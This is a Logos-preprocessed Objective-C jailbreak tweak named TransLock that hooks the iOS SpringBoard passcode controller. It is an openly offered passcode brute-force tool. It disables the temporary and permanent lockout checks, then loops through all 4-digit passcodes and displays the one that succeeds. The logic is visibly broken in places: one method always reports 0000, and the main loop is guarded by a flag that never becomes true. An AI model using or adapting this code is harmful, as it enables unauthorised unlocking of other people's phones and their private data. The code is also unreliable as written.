#line 1 "Tweak.xm"

@interface SBFUserAuthenticationController : NSObject
-(BOOL)_isTemporarilyBlocked;
-(BOOL)_isPermanentlyBlocked;
-(BOOL)_authenticateWithPasscodeData:(id)arg1 outError:(id*)arg2;
@end

@interface TransLock : NSObject
+ (id)sharedInstance;
- (void)bruteforce;
@end

NSString *numString;

@implementation TransLock
+ (instancetype)sharedInstance {
	static TransLock *__sharedInstance;
	static dispatch_once_t onceToken;
 
	dispatch_once(&onceToken, ^{
		__sharedInstance = [[self alloc] init];
	});
	return __sharedInstance;
}

- (void)bruteforce {
	for (int i = 0; i <= 9999; i++)
	{
		numString = [NSString stringWithFormat:@"%04d", i];
		NSLog(@"Testing : %@", numString);
		
		if (TRUE) {
			[[[UIAlertView alloc] initWithTitle:@"TransLock" message:[NSString stringWithFormat:@"Password is %@", numString] delegate:nil cancelButtonTitle:@"Dismiss" otherButtonTitles:nil] show];
			NSLog(@"Password is : %@", numString);
			break;
		}
	}

}
@end 


#include <substrate.h>
#if defined(__clang__)
#if __has_feature(objc_arc)
#define _LOGOS_SELF_TYPE_NORMAL __unsafe_unretained
#define _LOGOS_SELF_TYPE_INIT __attribute__((ns_consumed))
#define _LOGOS_SELF_CONST const
#define _LOGOS_RETURN_RETAINED __attribute__((ns_returns_retained))
#else
#define _LOGOS_SELF_TYPE_NORMAL
#define _LOGOS_SELF_TYPE_INIT
#define _LOGOS_SELF_CONST
#define _LOGOS_RETURN_RETAINED
#endif
#else
#define _LOGOS_SELF_TYPE_NORMAL
#define _LOGOS_SELF_TYPE_INIT
#define _LOGOS_SELF_CONST
#define _LOGOS_RETURN_RETAINED
#endif

@class SBFUserAuthenticationController; @class SpringBoard; 
static BOOL (*_logos_orig$_ungrouped$SBFUserAuthenticationController$_isTemporarilyBlocked)(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL); static BOOL _logos_method$_ungrouped$SBFUserAuthenticationController$_isTemporarilyBlocked(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL); static BOOL (*_logos_orig$_ungrouped$SBFUserAuthenticationController$_isPermanentlyBlocked)(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL); static BOOL _logos_method$_ungrouped$SBFUserAuthenticationController$_isPermanentlyBlocked(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL); static BOOL (*_logos_meta_orig$_ungrouped$SBFUserAuthenticationController$_isInGracePeriodState)(_LOGOS_SELF_TYPE_NORMAL Class _LOGOS_SELF_CONST, SEL); static BOOL _logos_meta_method$_ungrouped$SBFUserAuthenticationController$_isInGracePeriodState(_LOGOS_SELF_TYPE_NORMAL Class _LOGOS_SELF_CONST, SEL); static BOOL (*_logos_meta_orig$_ungrouped$SBFUserAuthenticationController$_isInBioUnlockState)(_LOGOS_SELF_TYPE_NORMAL Class _LOGOS_SELF_CONST, SEL); static BOOL _logos_meta_method$_ungrouped$SBFUserAuthenticationController$_isInBioUnlockState(_LOGOS_SELF_TYPE_NORMAL Class _LOGOS_SELF_CONST, SEL); static BOOL (*_logos_orig$_ungrouped$SBFUserAuthenticationController$_performNilPasscodeCheck)(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL); static BOOL _logos_method$_ungrouped$SBFUserAuthenticationController$_performNilPasscodeCheck(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL); static BOOL (*_logos_orig$_ungrouped$SBFUserAuthenticationController$_isUserAuthenticated)(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL); static BOOL _logos_method$_ungrouped$SBFUserAuthenticationController$_isUserAuthenticated(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL); static void (*_logos_orig$_ungrouped$SBFUserAuthenticationController$_revokeAuthenticationImmediately$forPublicReason$)(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL, BOOL, id); static void _logos_method$_ungrouped$SBFUserAuthenticationController$_revokeAuthenticationImmediately$forPublicReason$(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL, BOOL, id); static BOOL (*_logos_orig$_ungrouped$SBFUserAuthenticationController$_shouldRevokeAuthenticationNow)(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL); static BOOL _logos_method$_ungrouped$SBFUserAuthenticationController$_shouldRevokeAuthenticationNow(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL); static id (*_logos_orig$_ungrouped$SBFUserAuthenticationController$_lastIncorrectPasscodeAttempt)(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL); static id _logos_method$_ungrouped$SBFUserAuthenticationController$_lastIncorrectPasscodeAttempt(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL); static void (*_logos_orig$_ungrouped$SBFUserAuthenticationController$_setLastIncorrectPasscodeAttempt$)(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL, id); static void _logos_method$_ungrouped$SBFUserAuthenticationController$_setLastIncorrectPasscodeAttempt$(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL, id); static BOOL (*_logos_orig$_ungrouped$SBFUserAuthenticationController$_authenticateWithPasscodeData$outError$)(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL, id, id*); static BOOL _logos_method$_ungrouped$SBFUserAuthenticationController$_authenticateWithPasscodeData$outError$(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST, SEL, id, id*); static void (*_logos_orig$_ungrouped$SpringBoard$applicationDidFinishLaunching$)(_LOGOS_SELF_TYPE_NORMAL SpringBoard* _LOGOS_SELF_CONST, SEL, id); static void _logos_method$_ungrouped$SpringBoard$applicationDidFinishLaunching$(_LOGOS_SELF_TYPE_NORMAL SpringBoard* _LOGOS_SELF_CONST, SEL, id); 

#line 42 "Tweak.xm"

static BOOL hasBeenCalled = NO;
static BOOL _logos_method$_ungrouped$SBFUserAuthenticationController$_isTemporarilyBlocked(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST __unused self, SEL __unused _cmd) {
	if (hasBeenCalled) {
		HBLogDebug(@"i AM BEING CALLED");
		double delayInSeconds = 15.0;
	dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, delayInSeconds * NSEC_PER_SEC);
	dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
		HBLogDebug(@"WELCOME TO THE JUNGLE!");
		for (int i = 0; i <= 9999; i++)
		{
			numString = [NSString stringWithFormat:@"%04d", i];
			NSLog(@"Testing : %@", numString);
			NSData* data = [numString dataUsingEncoding:NSUTF8StringEncoding];
			BOOL result = [self _authenticateWithPasscodeData:data outError:NULL];
			NSLog(@"The result is : %d", result);

			if (result == YES) {
				[[[UIAlertView alloc] initWithTitle:@"TransLock" message:[NSString stringWithFormat:@"Password is %@", numString] delegate:nil cancelButtonTitle:@"Dismiss" otherButtonTitles:nil] show];
				NSLog(@"Password is : %@", numString);
				break;
			}
		}

});
		

		hasBeenCalled = YES;
	}
	return NO;
}
static BOOL _logos_method$_ungrouped$SBFUserAuthenticationController$_isPermanentlyBlocked(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST __unused self, SEL __unused _cmd) {
	return NO;
}
static BOOL _logos_meta_method$_ungrouped$SBFUserAuthenticationController$_isInGracePeriodState(_LOGOS_SELF_TYPE_NORMAL Class _LOGOS_SELF_CONST __unused self, SEL __unused _cmd){
	BOOL val = _logos_meta_orig$_ungrouped$SBFUserAuthenticationController$_isInGracePeriodState(self, _cmd);
	HBLogDebug(@"_isInGracePeriodState %d", val);
	return val;
}
static BOOL _logos_meta_method$_ungrouped$SBFUserAuthenticationController$_isInBioUnlockState(_LOGOS_SELF_TYPE_NORMAL Class _LOGOS_SELF_CONST __unused self, SEL __unused _cmd){
	BOOL val = _logos_meta_orig$_ungrouped$SBFUserAuthenticationController$_isInBioUnlockState(self, _cmd);
	HBLogDebug(@"_isInBioUnlockState %d", val);
	return val;
}
static BOOL _logos_method$_ungrouped$SBFUserAuthenticationController$_performNilPasscodeCheck(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST __unused self, SEL __unused _cmd){
	BOOL val = _logos_orig$_ungrouped$SBFUserAuthenticationController$_performNilPasscodeCheck(self, _cmd);
	HBLogDebug(@"_performNilPasscodeCheck %d", val);
	return val;
}

static BOOL _logos_method$_ungrouped$SBFUserAuthenticationController$_isUserAuthenticated(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST __unused self, SEL __unused _cmd){
	BOOL val = _logos_orig$_ungrouped$SBFUserAuthenticationController$_isUserAuthenticated(self, _cmd);
	HBLogDebug(@"_isUserAuthenticated %d", val);
	return val;
}

static void _logos_method$_ungrouped$SBFUserAuthenticationController$_revokeAuthenticationImmediately$forPublicReason$(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST __unused self, SEL __unused _cmd, BOOL arg1, id arg2) {
	BOOL val = arg1;
	HBLogDebug(@"has been revoked? %d because of %@", val, arg2);
	_logos_orig$_ungrouped$SBFUserAuthenticationController$_revokeAuthenticationImmediately$forPublicReason$(self, _cmd, arg1, arg2);
}
static BOOL _logos_method$_ungrouped$SBFUserAuthenticationController$_shouldRevokeAuthenticationNow(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST __unused self, SEL __unused _cmd){
	BOOL val = _logos_orig$_ungrouped$SBFUserAuthenticationController$_shouldRevokeAuthenticationNow(self, _cmd);
	HBLogDebug(@"_shouldRevokeAuthenticationNow %d", val);
	return val;
}
static id _logos_method$_ungrouped$SBFUserAuthenticationController$_lastIncorrectPasscodeAttempt(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST __unused self, SEL __unused _cmd) {
	id val = _logos_orig$_ungrouped$SBFUserAuthenticationController$_lastIncorrectPasscodeAttempt(self, _cmd);
	HBLogDebug(@"_lastIncorrectPasscodeAttempt %@", val);
	return _logos_orig$_ungrouped$SBFUserAuthenticationController$_lastIncorrectPasscodeAttempt(self, _cmd);
}
static void _logos_method$_ungrouped$SBFUserAuthenticationController$_setLastIncorrectPasscodeAttempt$(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST __unused self, SEL __unused _cmd, id arg1) {
	id val = arg1;
	HBLogDebug(@"_setLastIncorrectPasscodeAttempt %@", val);
	_logos_orig$_ungrouped$SBFUserAuthenticationController$_setLastIncorrectPasscodeAttempt$(self, _cmd, arg1);
}

static BOOL _logos_method$_ungrouped$SBFUserAuthenticationController$_authenticateWithPasscodeData$outError$(_LOGOS_SELF_TYPE_NORMAL SBFUserAuthenticationController* _LOGOS_SELF_CONST __unused self, SEL __unused _cmd, id arg1, id* arg2) {
	




















	return _logos_orig$_ungrouped$SBFUserAuthenticationController$_authenticateWithPasscodeData$outError$(self, _cmd, arg1, arg2);
}



static void _logos_method$_ungrouped$SpringBoard$applicationDidFinishLaunching$(_LOGOS_SELF_TYPE_NORMAL SpringBoard* _LOGOS_SELF_CONST __unused self, SEL __unused _cmd, id arg1) {
	_logos_orig$_ungrouped$SpringBoard$applicationDidFinishLaunching$(self, _cmd, arg1);
	
}

static __attribute__((constructor)) void _logosLocalInit() {
{Class _logos_class$_ungrouped$SBFUserAuthenticationController = objc_getClass("SBFUserAuthenticationController"); Class _logos_metaclass$_ungrouped$SBFUserAuthenticationController = object_getClass(_logos_class$_ungrouped$SBFUserAuthenticationController); MSHookMessageEx(_logos_class$_ungrouped$SBFUserAuthenticationController, @selector(_isTemporarilyBlocked), (IMP)&_logos_method$_ungrouped$SBFUserAuthenticationController$_isTemporarilyBlocked, (IMP*)&_logos_orig$_ungrouped$SBFUserAuthenticationController$_isTemporarilyBlocked);MSHookMessageEx(_logos_class$_ungrouped$SBFUserAuthenticationController, @selector(_isPermanentlyBlocked), (IMP)&_logos_method$_ungrouped$SBFUserAuthenticationController$_isPermanentlyBlocked, (IMP*)&_logos_orig$_ungrouped$SBFUserAuthenticationController$_isPermanentlyBlocked);MSHookMessageEx(_logos_metaclass$_ungrouped$SBFUserAuthenticationController, @selector(_isInGracePeriodState), (IMP)&_logos_meta_method$_ungrouped$SBFUserAuthenticationController$_isInGracePeriodState, (IMP*)&_logos_meta_orig$_ungrouped$SBFUserAuthenticationController$_isInGracePeriodState);MSHookMessageEx(_logos_metaclass$_ungrouped$SBFUserAuthenticationController, @selector(_isInBioUnlockState), (IMP)&_logos_meta_method$_ungrouped$SBFUserAuthenticationController$_isInBioUnlockState, (IMP*)&_logos_meta_orig$_ungrouped$SBFUserAuthenticationController$_isInBioUnlockState);MSHookMessageEx(_logos_class$_ungrouped$SBFUserAuthenticationController, @selector(_performNilPasscodeCheck), (IMP)&_logos_method$_ungrouped$SBFUserAuthenticationController$_performNilPasscodeCheck, (IMP*)&_logos_orig$_ungrouped$SBFUserAuthenticationController$_performNilPasscodeCheck);MSHookMessageEx(_logos_class$_ungrouped$SBFUserAuthenticationController, @selector(_isUserAuthenticated), (IMP)&_logos_method$_ungrouped$SBFUserAuthenticationController$_isUserAuthenticated, (IMP*)&_logos_orig$_ungrouped$SBFUserAuthenticationController$_isUserAuthenticated);MSHookMessageEx(_logos_class$_ungrouped$SBFUserAuthenticationController, @selector(_revokeAuthenticationImmediately:forPublicReason:), (IMP)&_logos_method$_ungrouped$SBFUserAuthenticationController$_revokeAuthenticationImmediately$forPublicReason$, (IMP*)&_logos_orig$_ungrouped$SBFUserAuthenticationController$_revokeAuthenticationImmediately$forPublicReason$);MSHookMessageEx(_logos_class$_ungrouped$SBFUserAuthenticationController, @selector(_shouldRevokeAuthenticationNow), (IMP)&_logos_method$_ungrouped$SBFUserAuthenticationController$_shouldRevokeAuthenticationNow, (IMP*)&_logos_orig$_ungrouped$SBFUserAuthenticationController$_shouldRevokeAuthenticationNow);MSHookMessageEx(_logos_class$_ungrouped$SBFUserAuthenticationController, @selector(_lastIncorrectPasscodeAttempt), (IMP)&_logos_method$_ungrouped$SBFUserAuthenticationController$_lastIncorrectPasscodeAttempt, (IMP*)&_logos_orig$_ungrouped$SBFUserAuthenticationController$_lastIncorrectPasscodeAttempt);MSHookMessageEx(_logos_class$_ungrouped$SBFUserAuthenticationController, @selector(_setLastIncorrectPasscodeAttempt:), (IMP)&_logos_method$_ungrouped$SBFUserAuthenticationController$_setLastIncorrectPasscodeAttempt$, (IMP*)&_logos_orig$_ungrouped$SBFUserAuthenticationController$_setLastIncorrectPasscodeAttempt$);MSHookMessageEx(_logos_class$_ungrouped$SBFUserAuthenticationController, @selector(_authenticateWithPasscodeData:outError:), (IMP)&_logos_method$_ungrouped$SBFUserAuthenticationController$_authenticateWithPasscodeData$outError$, (IMP*)&_logos_orig$_ungrouped$SBFUserAuthenticationController$_authenticateWithPasscodeData$outError$);Class _logos_class$_ungrouped$SpringBoard = objc_getClass("SpringBoard"); MSHookMessageEx(_logos_class$_ungrouped$SpringBoard, @selector(applicationDidFinishLaunching:), (IMP)&_logos_method$_ungrouped$SpringBoard$applicationDidFinishLaunching$, (IMP*)&_logos_orig$_ungrouped$SpringBoard$applicationDidFinishLaunching$);} }
#line 151 "Tweak.xm"
